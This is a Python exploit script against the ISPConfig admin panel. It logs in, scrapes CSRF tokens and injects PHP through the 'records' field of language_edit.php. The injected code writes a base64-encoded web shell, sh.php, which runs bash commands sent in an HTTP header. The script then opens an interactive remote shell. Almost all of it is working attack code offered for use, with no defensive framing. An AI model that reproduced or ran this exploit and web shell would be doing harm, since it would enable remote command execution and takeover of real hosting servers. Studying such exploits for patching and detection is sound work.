# WRITTEN BY SLASHER

import requests
import sys
import base64
import string
import random

print("Lets get itttttt")

def ensure_url_format(url):
    if not url.startswith(("http://", "https://")):
        raise ValueError("URL must start with 'http://' or 'https://'")

    if not url.endswith("/"):
        url += "/"

    return url

def login(url, user, password):
    print(f"[+] Logging in with username '{user}' and password '{password}'")
    
    session = requests.Session()
    
    login_url = f"{url}login/"
    login_data = {
        'username': user,
        'password': password,
        's_mod': 'login'
    }
    
    response = session.post(login_url, data=login_data, verify=False)
    
    if "Username or Password wrong" in response.text:
        sys.exit("[-] Login failed!")
    
    return session

def inject_shell(session, url):
    print("[+] Injecting shell")
    
    php_code = """
    <?php
    if (isset($_SERVER['HTTP_C'])) {
        $cmd = base64_decode($_SERVER['HTTP_C']);
        $descriptorspec = array(
           0 => array("pipe", "r"),
           1 => array("pipe", "w"),
           2 => array("pipe", "w")
        );
        
        $process = proc_open('/bin/bash', $descriptorspec, $pipes);
        
        if (is_resource($process)) {
            fwrite($pipes[0], $cmd);
            fclose($pipes[0]);
            
            $stdout = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            
            $stderr = stream_get_contents($pipes[2]);
            fclose($pipes[2]);
            
            $return_value = proc_close($process);
            
            echo "__STDOUT__" . $stdout . "__STDOUT__";
            echo "__STDERR__" . $stderr . "__STDERR__";
            echo "__RETURN__" . $return_value . "__RETURN__";
        }
    }
    ?>
    """
    
    encoded_php = base64.b64encode(php_code.encode()).decode()

    injection_payload = f"'];file_put_contents('sh.php',base64_decode('{encoded_php}'));die;#"
    lang_file = ''.join(random.choices(string.ascii_letters,k=8))+ ".lng"

    lang_edit_url = f"{url}admin/language_edit.php"
    lang_data = {
        'lang': 'en',
        'module': 'help',
        'lang_file': lang_file
    }

    response = session.post(lang_edit_url, data=lang_data, verify=False)

    try:
        csrf_id = response.text.split('_csrf_id" value="')[1].split('"')[0]
        csrf_key = response.text.split('_csrf_key" value="')[1].split('"')[0]
    except IndexError:
        sys.exit("[-] CSRF ID or Key not found!")

    lang_data.update({
        '_csrf_id': csrf_id,
        '_csrf_key': csrf_key,
        'records[\\]': injection_payload
    })

    session.post(lang_edit_url, data=lang_data, verify=False)

def launch_shell(session, url):
    print("[+] Launching shell")

    shell_url = f"{url}admin/sh.php"

    while True:
        try:
            cmd = input("\nispconfig-shell# ")
            if cmd.lower() == "exit":
                break
            
            headers = {
                'C': base64.b64encode(cmd.encode()).decode()
            }

            response = session.get(shell_url, headers=headers, verify=False)
            
            if "__STDOUT__" in response.text and "__STDERR__" in response.text and "__RETURN__" in response.text:
                stdout = response.text.split("__STDOUT__")[1].split("__STDERR__")[0]
                stderr = response.text.split("__STDERR__")[1].split("__RETURN__")[0]
                ret_val = response.text.split("__RETURN__")[1]
                
                print("Stdout:")
                print(stdout)
                print("Stderr:")
                print(stderr)
                print("Return Value:", ret_val)
            else:
                print("Error: Shell output format unexpected.")
        except KeyboardInterrupt:
            sys.exit("\n[+] Exiting.")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        sys.exit(f"\nUsage: python {sys.argv[0]} <URL> <Username> <Password>\n")
    
    url, user, password = sys.argv[1], sys.argv[2], sys.argv[3]

    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

    nice_url = ensure_url_format(url)
    print("[+] Target URL: "+nice_url)
    session = login(nice_url, user, password)
    inject_shell(session, nice_url)
    launch_shell(session, nice_url)
